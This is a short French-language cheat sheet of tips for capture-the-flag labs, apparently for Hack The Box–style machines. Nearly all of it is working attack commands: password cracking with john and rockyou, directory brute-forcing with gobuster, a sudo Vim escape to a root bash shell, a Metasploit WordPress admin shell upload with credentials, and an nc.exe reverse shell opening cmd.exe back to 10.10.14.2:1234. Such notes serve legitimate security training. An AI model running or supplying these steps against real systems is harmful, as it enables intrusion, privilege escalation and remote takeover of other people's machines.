# Astuces et mémos CTF

Liste de mots de passe dans Kali situés dans /usr/share/wordlist/. Exemple d'utilisation avec john
```
john cisco.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

Liste de répertoires web à tester pour trouver des fichiers et répertoires avec Dirbuster ou Gobuster : **/usr/share/wordlist/dirb/** ou **/usr/share/wordlist/dirbuster/**.  Exemple : ```./gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt```.

Passer à un shell BASH
```
SHELL=/bin/bash script -q /dev/null
```

Afficher les commandes exécutables en sudo
```
sudo -l
```

Escalation de privilège depuis Vi/Vim
```
sudo /file/file.conf
:!/bin/bash
```

En cas d'accès à un wp-admin, possibilité de faire un reverse shell avec Metasploit :
```
msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set PASSWORD P@s5w0rd!
msf > set USERNAME admin
msf > set TARGETURI /wordpress
msf > set RHOSTS 10.10.10.29
msf > run
```

Puis avoir un shell propre :
```
meterpreter> lcd /home/username/Downloads
meterpreter> cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
meterpreter > upload /usr/share/windows-binaries/nc.exe
```

En même temps, ouvrir un listener netcat dans un autre terminal : ```nc -lnvp 1234```.
```
meterpreter> execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
```

Un shell est accessible depuis le listener Netcat.